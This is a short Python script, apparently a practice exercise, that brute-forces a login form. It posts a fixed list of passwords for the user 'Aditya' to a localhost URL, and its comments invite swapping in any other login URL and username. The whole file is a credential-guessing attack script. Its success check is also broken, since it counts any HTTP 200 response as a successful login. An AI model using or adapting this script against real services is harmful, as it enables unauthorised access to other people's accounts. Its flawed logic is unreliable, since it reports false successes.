import requests

login_url = 'http://127.0.0.1:5500/Login/INDEX.HTML'  # Update with your login URL
username = 'Aditya'  # Update with the username
password_list = ['0000', '1111', '2222', '3333', '4444', '5555']  # List of passwords to try

for password in password_list:
    payload = {'username': username, 'password': password}
    response = requests.post(login_url, data=payload)

    if response.status_code == 200:
        print(f"Login successful with password: {password}")
        break
    else:
        print(f"Login failed with password: {password}, status code: {response.status_code}")
